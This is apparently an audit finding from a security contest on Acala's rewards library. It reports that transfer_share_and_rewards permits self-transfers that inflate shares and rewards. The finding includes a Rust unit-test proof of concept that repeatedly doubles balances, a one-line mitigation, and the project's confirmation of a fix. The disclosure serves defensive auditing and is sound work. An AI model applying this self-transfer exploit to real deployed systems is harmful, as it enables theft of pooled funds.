[H-01]transfer_share_and_rewardsallows for self transfer
Submitted byZanyBonzy, also found byihtishamsudo
The rewards library holds thetransfer_share_and_rewardsallows for self transfer which can be used to double shares and rewards. Important to note that the function, for now is not in use by the in-scope contracts. However, I still believe itâ€™s worth pointing out.
Proof of Concept
Copy and paste the below test intotests.rs. It shows how users Alice and Bob, by invoking this function, can increase their share/rewards balance.
fntransfer_to_self() {ExtBuilder::default().build().execute_with(|| {// Open a pool with bob holding 100 shares in the poolRewardsModule::add_share(&BOB, &DOT_POOL,100);// Accumulate rewardsassert_ok!(RewardsModule::accumulate_reward(&DOT_POOL, NATIVE_COIN,100));// Alice deposits into the pool and gets shares, assert that it succeedsRewardsModule::add_share(&ALICE, &DOT_POOL,100);// Assert that rewards still existassert_ok!(RewardsModule::accumulate_reward(&DOT_POOL, NATIVE_COIN,100));// Gets pools infoletpool_info = RewardsModule::pool_infos(DOT_POOL);// Ensures that reward transfer doesn't affect poolletnew_pool_info = RewardsModule::pool_infos(DOT_POOL);assert_eq!(pool_info, new_pool_info,"reward transfer does not affect the pool");// Assert that Alice's share/rewards transfer to self succeedsassert_ok!(RewardsModule::transfer_share_and_rewards(&ALICE, &DOT_POOL,90, &ALICE));// Assert that alice's share/reward balance has now increasedassert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, ALICE),(190,vec![(NATIVE_COIN,190)].into_iter().collect()));// Alice has discovered infinite money glitch? She tries again to be sure its not a fluke// Alice's transfers shares and rewards again to to self, assert that it succeedsassert_ok!(RewardsModule::transfer_share_and_rewards(&ALICE, &DOT_POOL,180, &ALICE));// Assert that her share/reward balance still increasedassert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, ALICE),(370,vec![(NATIVE_COIN,370)].into_iter().collect()));// She transfers a some of her shares/rewards to Bob, while teaching him the glitchassert_ok!(RewardsModule::transfer_share_and_rewards(&ALICE, &DOT_POOL,70, &BOB));assert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, ALICE),(300,vec![(NATIVE_COIN,300)].into_iter().collect()));assert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, BOB),(170,vec![(NATIVE_COIN,70)].into_iter().collect()));// Bob decides to try it out himself, Assert that it worksassert_ok!(RewardsModule::transfer_share_and_rewards(&BOB, &DOT_POOL,100, &BOB));assert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, BOB),(270,vec![(NATIVE_COIN,111)].into_iter().collect()));assert_ok!(RewardsModule::transfer_share_and_rewards(&BOB, &DOT_POOL,100, &BOB));assert_eq!(RewardsModule::shares_and_withdrawn_rewards(DOT_POOL, BOB),(370,vec![(NATIVE_COIN,152)].into_iter().collect()));});}
Recommended Mitigation Steps
Include a check in the function that returns ifwho==other.
Lambda (judge) increased severity to High
xlc (Acala) confirmed and commented:
Fixed bythis PR. Just want to highlight thattransfer_share_and_rewardsis not currently used.